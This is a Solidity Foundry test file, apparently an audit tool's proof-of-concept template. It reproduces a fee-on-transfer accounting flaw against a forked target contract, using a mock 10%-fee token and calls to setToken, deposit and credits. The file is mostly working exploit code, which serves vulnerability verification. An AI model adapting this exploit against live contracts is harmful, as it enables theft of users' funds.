// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Fee-on-transfer accounting mismatch
/// @notice Detector: fee-on-transfer. The target assumes a token transfer
///         moved the FULL amount, but a fee-on-transfer token delivers
///         less. The target credits the full amount, so its ledger exceeds
///         its real balance -- later withdrawals overpay / brick.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. Uses a mock 10%-fee token. TODO: adapt
///      setToken() / deposit() / the credit view to the target.

contract MockFoTToken {
    string public constant name = "MockFoT";
    string public constant symbol = "FOT";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        balanceOf[msg.sender] = 1_000_000 ether;
    }

    // Takes a 10% fee on every transfer.
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += (amount * 90) / 100;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += (amount * 90) / 100;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        MockFoTToken mock = new MockFoTToken();

        // Give the attacker FoT tokens.
        mock.transfer(attackerEOA, 1000 ether);

        (bool setOk,) = target.call(
            abi.encodeWithSignature("setToken(address)", address(mock))
        );
        require(setOk, "setToken(address) failed -- adapt to the target's token setter");

        // TODO: adapt to the target's real deposit + credit view.
        vm.prank(attackerEOA);
        (bool approveOk,) = address(mock).call(
            abi.encodeWithSignature("approve(address,uint256)", target, 100 ether)
        );
        require(approveOk, "approve failed");
        vm.prank(attackerEOA);
        (bool depOk,) = target.call(
            abi.encodeWithSignature("deposit(uint256)", 100 ether)
        );
        require(depOk, "deposit failed -- adapt to the target's deposit function");

        (bool credOk, bytes memory ret) =
            target.staticcall(abi.encodeWithSignature("credits(address)", attackerEOA));
        require(credOk, "target has no credits(address) view -- adapt the accounting check");
        uint256 credited = abi.decode(ret, (uint256));
        uint256 actuallyReceived = mock.balanceOf(target);
        console.log("credited by target:", credited);
        console.log("actually received:", actuallyReceived);
        // Vulnerable: credited 100, received 90. Correct: credited 90.
        assertGt(credited, actuallyReceived, "exploit did not reproduce: target measured the real amount");
    }
}
